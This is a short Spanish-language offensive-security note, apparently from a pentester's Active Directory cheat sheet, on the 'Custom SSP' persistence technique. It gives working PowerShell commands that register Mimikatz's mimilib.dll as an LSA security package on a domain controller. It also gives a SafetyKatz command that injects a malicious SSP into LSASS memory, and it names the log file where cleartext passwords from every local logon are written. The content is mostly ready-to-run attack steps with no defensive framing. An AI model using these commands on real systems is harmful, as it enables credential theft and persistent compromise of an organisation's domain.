# Custom SSP 

Tags: #AD #Windows #Powershell #SafetyKatz 

```bash 
Un 'Security Support Provider (SSP)' es una DLL que proporciona mecanismos para que una aplicación obtenga una conexión autenticada. Algunos paquetes SSP de Microsoft son:

- NTLM
- Kerberos
- Wdigest
- CredSSP

'Mimikatz' proporciona un SSP personalizado — 'mimilib.dll'. Este SSP registra inicios de sesión locales, así como contraseñas de cuentas de servicio y de máquina en texto claro en el servidor objetivo.
```

```powershell 
! Usuario: Domain Admin (ejecutado en el DC)

❯ $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
❯ $packages += "mimilib"
❯ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
❯ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
# Registrar mimilib.dll como Security Package en el DC — persiste entre reinicios y loguea credenciales en texto claro de todos los logons locales en C:\Windows\system32\mimilsa.log.

❯ SafetyKatz.exe -Command '"misc::memssp"'
# Inyectar un SSP malicioso en LSASS en memoria — captura credenciales de logons sin necesidad de reinicio. Menos estable en Server 2019/2022 pero funcional.


Notas:
	1. Todos los inicios de sesión locales en el Domain Controller se registran en 'C:\Windows\system32\mimilsa.log'.
```